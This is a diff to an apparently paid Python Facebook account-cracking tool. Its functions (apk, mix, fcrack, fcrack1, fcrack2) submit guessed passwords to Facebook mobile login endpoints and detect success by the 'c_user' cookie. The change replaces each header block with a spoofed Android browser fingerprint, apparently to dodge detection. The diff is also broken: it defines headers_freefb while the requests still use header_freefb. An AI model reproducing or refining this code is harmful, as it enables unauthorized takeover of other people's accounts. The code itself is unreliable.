@@ -670,21 +670,27 @@ def apk(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'free.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    # Requests sorts cookies= alphabetically
-    # 'cookie': 'datr=tOkiZNWxg4iFXk5vay1l9zod; sb=tOkiZGd_Cjyhf0J3U3WOykHF; fr=0nV7Hu0FobD3Mnt95..BkIwev.xy.AAA.0.0.BkIwfS.AWUp262_CR0',
-    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-platform': '"Linux"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': pro}
+            headers_freefb = {  'authority': 'mbasic.facebook.com',
+              "method": 'GET',
+              "scheme": 'https',
+              'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+              'accept-language': 'en-US,en;q=0.9',
+              'cache-control': 'max-age=0',
+              'dpr': '2',
+              'sec-ch-prefers-color-scheme': 'dark',
+              'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+              'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+              'sec-ch-ua-mobile': '?1',
+              'sec-ch-ua-model': '"TECNO KL5"',
+              'sec-ch-ua-platform': '"Android"',
+              'sec-ch-ua-platform-version': '"14.0.0"',
+             'sec-fetch-dest': 'document',
+              'sec-fetch-mode': 'navigate',
+              'sec-fetch-site': 'same-origin',
+              'sec-fetch-user': '?1',
+              'upgrade-insecure-requests': '1',
+              'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+              'viewport-width': '980',}
             lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
@@ -729,21 +735,27 @@ def mix(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'x.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    # Requests sorts cookies= alphabetically
-    # 'cookie': 'datr=Ji4VZGZ3I-Qd_1lNkI8Zgwin; sb=Ji4VZL-eh-3pDCkWecuumAFU; dpr=3; m_pixel_ratio=3; wd=980x1426; fr=0RKXIq2Fcifn9dnQp..BkFS4m.5f.AAA.0.0.BkHsc5.AWVNSGX4Pew',
-    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-platform': '"Linux"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': pro}
+            headers_freefb = {  'authority': 'mbasic.facebook.com',
+              "method": 'GET',
+              "scheme": 'https',
+              'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+              'accept-language': 'en-US,en;q=0.9',
+              'cache-control': 'max-age=0',
+              'dpr': '2',
+              'sec-ch-prefers-color-scheme': 'dark',
+              'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+              'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+              'sec-ch-ua-mobile': '?1',
+              'sec-ch-ua-model': '"TECNO KL5"',
+              'sec-ch-ua-platform': '"Android"',
+              'sec-ch-ua-platform-version': '"14.0.0"',
+             'sec-fetch-dest': 'document',
+              'sec-fetch-mode': 'navigate',
+              'sec-fetch-site': 'same-origin',
+              'sec-fetch-user': '?1',
+              'upgrade-insecure-requests': '1',
+              'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+              'viewport-width': '980',}
             lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
@@ -787,21 +799,27 @@ def fcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'p.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    # Requests sorts cookies= alphabetically
-    # 'cookie': 'datr=Ji4VZGZ3I-Qd_1lNkI8Zgwin; sb=Ji4VZL-eh-3pDCkWecuumAFU; dpr=3; m_pixel_ratio=3; wd=980x1426; fr=0RKXIq2Fcifn9dnQp..BkFS4m.5f.AAA.0.0.BkHsIu.AWXnr0C8kDY',
-    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-platform': '"Linux"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': pro}
+            headers_freefb = {  'authority': 'mbasic.facebook.com',
+              "method": 'GET',
+              "scheme": 'https',
+              'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+              'accept-language': 'en-US,en;q=0.9',
+              'cache-control': 'max-age=0',
+              'dpr': '2',
+              'sec-ch-prefers-color-scheme': 'dark',
+              'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+              'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+              'sec-ch-ua-mobile': '?1',
+              'sec-ch-ua-model': '"TECNO KL5"',
+              'sec-ch-ua-platform': '"Android"',
+              'sec-ch-ua-platform-version': '"14.0.0"',
+             'sec-fetch-dest': 'document',
+              'sec-fetch-mode': 'navigate',
+              'sec-fetch-site': 'same-origin',
+              'sec-fetch-user': '?1',
+              'upgrade-insecure-requests': '1',
+              'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+              'viewport-width': '980',}
             lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
@@ -845,21 +863,27 @@ def fcrack1(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'x.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    # Requests sorts cookies= alphabetically
-    # 'cookie': 'datr=Ji4VZGZ3I-Qd_1lNkI8Zgwin; sb=Ji4VZL-eh-3pDCkWecuumAFU; dpr=3; m_pixel_ratio=3; wd=980x1426; fr=0RKXIq2Fcifn9dnQp..BkFS4m.5f.AAA.0.0.BkHsc5.AWVNSGX4Pew',
-    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-platform': '"Linux"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': pro}
+            headers_freefb = {  'authority': 'mbasic.facebook.com',
+              "method": 'GET',
+              "scheme": 'https',
+              'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+              'accept-language': 'en-US,en;q=0.9',
+              'cache-control': 'max-age=0',
+              'dpr': '2',
+              'sec-ch-prefers-color-scheme': 'dark',
+              'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+              'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+              'sec-ch-ua-mobile': '?1',
+              'sec-ch-ua-model': '"TECNO KL5"',
+              'sec-ch-ua-platform': '"Android"',
+              'sec-ch-ua-platform-version': '"14.0.0"',
+             'sec-fetch-dest': 'document',
+              'sec-fetch-mode': 'navigate',
+              'sec-fetch-site': 'same-origin',
+              'sec-fetch-user': '?1',
+              'upgrade-insecure-requests': '1',
+              'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+              'viewport-width': '980',}
             lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
@@ -905,21 +929,27 @@ def fcrack2(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'free.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    # Requests sorts cookies= alphabetically
-    # 'cookie': 'datr=Ji4VZGZ3I-Qd_1lNkI8Zgwin; sb=Ji4VZL-eh-3pDCkWecuumAFU; dpr=3; wd=980x1426; fr=0RKXIq2Fcifn9dnQp..BkFS4m.5f.AAA.0.0.BkHsMY.AWWo4n0p9nQ',
-    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-platform': '"Linux"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': pro}
+            headers_freefb = {  'authority': 'mbasic.facebook.com',
+              "method": 'GET',
+              "scheme": 'https',
+              'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+              'accept-language': 'en-US,en;q=0.9',
+              'cache-control': 'max-age=0',
+              'dpr': '2',
+              'sec-ch-prefers-color-scheme': 'dark',
+              'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+              'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+              'sec-ch-ua-mobile': '?1',
+              'sec-ch-ua-model': '"TECNO KL5"',
+              'sec-ch-ua-platform': '"Android"',
+              'sec-ch-ua-platform-version': '"14.0.0"',
+             'sec-fetch-dest': 'document',
+              'sec-fetch-mode': 'navigate',
+              'sec-fetch-site': 'same-origin',
+              'sec-fetch-user': '?1',
+              'upgrade-insecure-requests': '1',
+              'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+              'viewport-width': '980',}
             lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
@@ -951,7 +981,7 @@ def approval():
     httpCaht = requests.get('https://github.com/Gojosaturo100pro/xemon/blob/main/xemon.txt').text
     if id in httpCaht:
       print("\33[1;32mYour Token is Successfully Approved")
-      print('\033[1;93mYour Token is Successfully Approved ')
+      #print('\033[1;93mYour Token is Successfully Approved ')
       psb('\033[1;97m[\033[92;1m•\033[1;97m]\033[1;97mYOUR KEY DONE PAID USER ADMIN PERMISSION EMON KHALIFA ')
       msg = str(os.geteuid())
       time.sleep(0.03)
